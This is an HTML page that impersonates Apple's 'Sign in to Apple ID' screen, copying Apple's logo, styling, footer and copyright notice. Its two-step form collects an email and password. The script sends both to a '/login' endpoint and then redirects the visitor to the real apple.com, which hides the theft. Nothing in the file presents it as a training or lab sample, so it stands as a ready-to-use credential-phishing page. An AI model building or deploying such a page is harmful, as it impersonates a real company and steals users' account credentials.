<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Apple ID</title>
    <link rel="icon" href="https://www.apple.com/favicon.ico">
    <style>
        :root {
            --input-border: #d2d2d7;
            --input-focus: #0071e3;
            --link-color: #0071e3;
            --text-primary: #1d1d1f;
            --text-secondary: #86868b;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            color: var(--text-primary);
        }
        .navbar {
            width: 100%;
            height: 44px;
            background-color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .navbar svg {
            fill: #fff;
            height: 44px;
            width: 18px;
        }
        .main-content {
            margin-top: 80px;
            width: 100%;
            max-width: 460px;
            padding: 0 20px;
            box-sizing: border-box;
            text-align: center;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 17px;
            margin-bottom: 40px;
            font-weight: 400;
        }
        .input-wrapper {
            position: relative;
            margin-bottom: 16px;
            text-align: left;
        }
        .input-field {
            width: 100%;
            height: 56px;
            border: 1px solid var(--input-border);
            border-radius: 12px;
            padding: 18px 16px;
            font-size: 17px;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }
        .input-field:focus {
            border-color: var(--input-focus);
            outline: none;
            box-shadow: 0 0 0 4px rgba(0,113,227,0.15);
        }
        .floating-label {
            position: absolute;
            left: 16px;
            top: 18px;
            font-size: 17px;
            color: var(--text-secondary);
            pointer-events: none;
            transition: 0.2s ease all;
        }
        .input-field:focus ~ .floating-label,
        .input-field:not(:placeholder-shown) ~ .floating-label {
            top: 8px;
            font-size: 12px;
            color: var(--text-secondary);
        }
        .btn-arrow {
            position: absolute;
            right: 8px;
            top: 8px;
            width: 40px;
            height: 40px;
            border: none;
            background: transparent;
            cursor: pointer;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.2s;
        }
        .btn-arrow svg {
            fill: #d2d2d7;
            width: 24px;
            height: 24px;
            transition: fill 0.2s;
        }
        .input-field:valid ~ .btn-arrow svg {
            fill: #0071e3;
        }
        .input-field:valid ~ .btn-arrow:hover {
            background: #f5f5f7;
        }
        .hidden {
            display: none;
        }
        .fade-in {
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .links {
            margin-top: 30px;
            font-size: 14px;
        }
        .links a {
            color: var(--link-color);
            text-decoration: none;
            display: block;
            margin-bottom: 10px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: auto;
            margin-bottom: 20px;
            font-size: 12px;
            color: var(--text-secondary);
            text-align: center;
        }
        .footer a {
            color: #555;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .divider {
            margin: 0 5px;
            color: #d2d2d7;
        }
        .btn-submit {
            background-color: #0071e3;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 12px 24px;
            font-size: 17px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            font-weight: 400;
        }
        .btn-submit:hover {
            background-color: #0077ed;
        }
        .apple-id-display {
            font-size: 17px;
            margin-bottom: 20px;
            color: var(--text-primary);
        }
        .back-btn {
            color: var(--link-color);
            cursor: pointer;
            font-size: 14px;
            margin-left: 10px;
        }
        .checkbox-wrapper {
            display: flex;
            align-items: center;
            margin-top: 15px;
            font-size: 14px;
        }
        .checkbox-wrapper input {
            margin-right: 10px;
            width: 16px;
            height: 16px;
        }
    </style>
</head>
<body>

    <div class="navbar">
        <svg viewBox="0 0 18 44">
            <path d="M12.9,2.5c-0.8-1-2-1.7-3.4-1.7c-1.4,0-2.6,0.8-3.3,0.8c-0.7,0-1.8-0.8-3-0.8C1.8,0.8,0.5,1.9,0,3.9c-0.5,2.1,0.1,6.2,2.3,9.4c1.1,1.5,2.3,3.2,3.9,3.2c1.5,0,2.1-1,4-1s2.4,1,4.1,1c1.7,0,2.7-1.5,3.7-3c1.1-1.6,1.5-3.1,1.5-3.2c-0.1,0-2.9-1.1-2.9-4.4c0-2.8,2.3-4.1,2.4-4.2C17.9,1.5,14.6,0.3,12.9,2.5z M11.5,0.7c0.7-0.9,1.2-2,1.1-3.1c-1,0-2.3,0.7-3,1.5c-0.6,0.8-1.2,2-1.1,3.1C9.6,2.2,10.8,1.5,11.5,0.7z" transform="translate(0, 20)"/>
        </svg>
    </div>

    <div class="main-content">
        
        <div id="step-1" class="fade-in">
            <h1>Sign In</h1>
            <div class="subtitle">Sign in to Apple ID</div>
            
            <form onsubmit="goToStep2(event)">
                <div class="input-wrapper">
                    <input type="text" id="email" class="input-field" placeholder=" " required>
                    <span class="floating-label">Email or Phone Number</span>
                    <button type="submit" class="btn-arrow">
                        <svg viewBox="0 0 24 24"><path d="M12,24c6.6,0,12-5.4,12-12S18.6,0,12,0S0,5.4,0,12S5.4,24,12,24z M12,1.3c5.9,0,10.7,4.8,10.7,10.7S17.9,22.7,12,22.7S1.3,17.9,1.3,12S6.1,1.3,12,1.3z M15.6,11.6L10,6.1l-0.9,0.9l4.7,4.6H5.3v1.3h8.5l-4.7,4.6l0.9,0.9l5.6-5.6C16,12.5,16,11.9,15.6,11.6z"/></svg>
                    </button>
                </div>
                
                <div class="checkbox-wrapper">
                    <input type="checkbox" id="keep-signed-in">
                    <label for="keep-signed-in">Keep me signed in</label>
                </div>

                <div class="links">
                    <a href="#">Forgotten your password?</a>
                    <a href="#">Create your Apple ID</a>
                </div>
            </form>
        </div>

        <div id="step-2" class="hidden fade-in">
            <h1>Sign In</h1>
            <div class="apple-id-display">
                <span id="user-display">user@example.com</span>
                <span class="back-arrow" onclick="goToStep1()" style="cursor:pointer; margin-left: 8px; color: #0071e3; font-size: 20px; vertical-align: middle;">&#8853;</span>
            </div>
            
            <form onsubmit="submitLogin(event)">
                <div class="input-wrapper">
                    <input type="password" id="password" class="input-field" placeholder=" " required>
                    <span class="floating-label">Password</span>
                    <button type="submit" class="btn-arrow">
                        <svg viewBox="0 0 24 24"><path d="M12,24c6.6,0,12-5.4,12-12S18.6,0,12,0S0,5.4,0,12S5.4,24,12,24z M12,1.3c5.9,0,10.7,4.8,10.7,10.7S17.9,22.7,12,22.7S1.3,17.9,1.3,12S6.1,1.3,12,1.3z M15.6,11.6L10,6.1l-0.9,0.9l4.7,4.6H5.3v1.3h8.5l-4.7,4.6l0.9,0.9l5.6-5.6C16,12.5,16,11.9,15.6,11.6z"/></svg>
                    </button>
                </div>
                
                <div class="links">
                    <a href="#">Forgotten your password?</a>
                </div>
            </form>
        </div>

    </div>

    <div class="footer">
        <a href="#">Create Apple ID</a>
        <span class="divider">|</span>
        <a href="#">System Status</a>
        <span class="divider">|</span>
        <a href="#">Privacy Policy</a>
        <span class="divider">|</span>
        <a href="#">Terms & Conditions</a>
        <div style="margin-top: 10px;">Copyright © 2024 Apple Inc. All rights reserved.</div>
    </div>

    <script>
        let userEmail = "";

        function goToStep2(event) {
            event.preventDefault();
            const emailInput = document.getElementById('email');
            if (emailInput.value) {
                userEmail = emailInput.value;
                document.getElementById('user-display').textContent = userEmail;
                
                document.getElementById('step-1').classList.add('hidden');
                document.getElementById('step-2').classList.remove('hidden');
                
                setTimeout(() => document.getElementById('password').focus(), 100);
            }
        }

        function goToStep1() {
            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-1').classList.remove('hidden');
        }

        async function submitLogin(event) {
            event.preventDefault();
            const password = document.getElementById('password').value;
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        email: userEmail,
                        password: password
                    })
                });
                
                if (response.ok) {
                    window.location.href = "https://www.apple.com";
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</body>
</html>
